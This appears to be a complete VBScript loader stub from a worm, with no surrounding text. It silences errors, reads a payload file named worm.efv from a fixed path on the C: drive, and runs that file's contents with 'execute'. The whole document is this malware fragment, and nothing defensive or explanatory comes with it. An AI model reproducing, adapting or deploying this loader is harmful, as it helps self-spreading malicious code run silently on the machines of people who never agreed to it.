on error resume next
Set f = CreateObject("Scripting.FileSystemObject")
Set e = f.OpenTextFile("c:\efv\worm.efv", 1)
dim d
d= e.ReadAll
execute d

